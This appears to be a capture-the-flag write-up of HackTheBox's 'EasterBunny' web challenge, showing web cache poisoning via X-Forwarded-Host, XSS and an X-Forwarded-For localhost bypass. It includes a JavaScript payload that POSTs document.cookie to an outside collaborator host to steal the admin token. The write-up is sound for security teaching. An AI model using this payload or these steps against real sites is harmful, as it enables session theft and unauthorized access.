---
layout: single
title: EasterBunny
excerpt: "It's that time of the year again! Write a letter to the Easter bunny and make your wish come true! But be careful what you wish for because the Easter bunny's helpers are watching!"
date: 2022-8-28
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - web
tags:  
  - web cache poisoning
  - cross site scripting
  - ip bypass
  - resource hijacking
---


It's that time of the year again! Write a letter to the Easter bunny and make your wish come true! But be careful what you wish for because the Easter bunny's helpers are watching! <br>

<h4 align="center">
<img src="https://user-images.githubusercontent.com/45040001/187103435-e7a41ec1-67d8-491a-9572-a340b96f265e.png">
</h4>


The EasterBunny is a easy challenge from hackthebox where you can learn a lot from it. Lets explain little bit the steps but with words, the first step is to identify web cache poisoning vulnerability and follow [web cache poisoning](https://portswigger.net/research/practical-web-cache-poisoning) methodology.
<br>
<br>
Let's start where the flag is stored.. The flag is stored at the 3rd letter which if you are not an admin you can't see and you will get an error message. Our steps is to be authenticated like a admin and get the flag.

## WCP Methodology
![image](https://user-images.githubusercontent.com/45040001/187235119-7f8f04e9-1a0e-4899-b623-109aae0d0ceb.png)

### Detect unkeyed input
We can detect & inject into cache a random string just using `X-Forwarded-Host` HTTP Header. Using this header we can perform a xss attack to steal some cookies from the user in our situation from `bot.js`.<br>
![detect_unkeyd_input](https://user-images.githubusercontent.com/45040001/187235463-af6684d1-b75f-422d-b08f-7515db78026a.png)
<br>
So we can see our unkeyed input injects 3 attributes and they are:
- /static/main.css
- `<base href="unkeyed input:port/static" />`
- /static/viewletter.js

When you see a javascript file like the `viewletter.js` immediately you think how you can perform a xss attack right?

![unkeyd_input](https://user-images.githubusercontent.com/45040001/187235510-121c99c8-0160-463d-b4e2-c95af06b362a.png)

![viewletter_javascript](https://user-images.githubusercontent.com/45040001/187235528-15b5cbc5-faea-4430-bef9-f7891538de51.png)

## Get prepared for the attack
For exploitation part first of all we need a HTTP server(free solution ngrok) and create a directory tree like that:
![187313837-93762db5-ebfc-4c99-9f69-132ce594b72c](https://user-images.githubusercontent.com/45040001/188494846-ad18b497-7d7c-4180-b1be-06d2092d45ea.png)
<br>
And the most important our malicious `viewletter.js` hosted in our http server where with this script we can steal the auth token and get the flag.
```javascript
//viewletter.js
fetch('http://4w1j76r5ydqthsa2yt357tr45vbmzb.burpcollaborator.net/', {
		    method: 'POST',
		    body: document.cookie
		    });
```
The challenge source code has a file called `authorisation.js` where somebody can see how `admin`  authorization works.<br>
So if someone wants to be authenticated like a admin he must be from localhost and he must know the `authSecret` which is a random value.
```javascript
const authSecret = require('crypto').randomBytes(69).toString('hex');

const isAdmin = (req, res) => {
  return req.ip === '127.0.0.1' && req.cookies['auth'] === authSecret;
};

module.exports = {
  authSecret,
  isAdmin,
};
```
So far so good.. But how will get the `authSecret` from admin? we should steal the cookies from him(or from `bot.js`)
```javascript
//part from bot.js
await page.setCookie({
            name: 'auth',
            value: authSecret,
            domain: '127.0.0.1',
        });
```

Now lets take a look how the bot visiting works. At source code of `routes.js` in the `/submit` route we can see the bot visit the last inserted letter but with a little bit different host, pay attention at `127.0.0.1`
```javascript
//part of routes.js
botVisiting = true;
await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);
botVisiting = false;
```

## Attack

So we retreive a lot of informations and they are:
- we find unkeyed inputs for web cache poisoning attack
- we have to poison the last inserted id(last submited letter)
- we have to steal the `authtoken`
- and grab the flag

First step is to setup our HTTP server with all files & directories included
![tt](https://user-images.githubusercontent.com/45040001/188495101-735dd790-a852-48a2-ad49-ec277bba5999.png)

<br>

Right now we are ready to start the whole attack step by step. Fist of all we need to know how many letters are saved in database to inject the last letter `/letters?id=${inserted.lastID}` to find how many letters are seved we can send just a GET requests at `/message/3` and you will get a response with the message of the letter and the counters of the letters. 

So at my situation the last letter is 16 so i have to inject the 17 letter. <br>
Inject values is:
- GET /letters?id=17
- HOST: 127.0.0.1 | because of this piece of code `await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);`
- X-Forwarded-Host: your-ngrok-ip.com

![web_poisoning](https://user-images.githubusercontent.com/45040001/187318535-9fc0269b-fac7-46a6-bbf9-3f048cedcd05.png)

Send the injection requests and instantly we have to submit a new letter and this letter will be injected .
![submit_new_letter](https://user-images.githubusercontent.com/45040001/187318584-250a390e-745c-4d8f-b3e1-7f5560ca3c8c.png)


after a few seconds we will successfully get the admin secret(authtoken) in our burpcollaborator.
![auth_cookie](https://user-images.githubusercontent.com/45040001/187318627-f3192d7b-3d86-4010-8e6e-0c298ca62a65.png)

The next step is to bypass localhost restriction and i do that with `X-Fowarded-For` HTTP Header as i show below.

![get_flag_1](https://user-images.githubusercontent.com/45040001/187318708-ded902f8-0e25-4926-897e-8b185b125da4.png)

[ip bypass headers](https://gist.githubusercontent.com/kaimi-/6b3c99538dce9e3d29ad647b325007c1/raw/339dad3040fd1a967588edf341eb72b033a9d9fe/gistfile1.txt) <br>

![get_flag_2](https://user-images.githubusercontent.com/45040001/187318715-5c3adc65-87fd-4c8f-ba4f-b9ee3676de8b.png)

![correct_payload](https://user-images.githubusercontent.com/45040001/187318812-fb0b7c39-bb01-4797-8f2d-690a260b33d3.png)

grab the flag. <br>
![final_flag](https://user-images.githubusercontent.com/45040001/187318733-85d968a5-fe2a-43b5-b121-949d8528c19f.png)



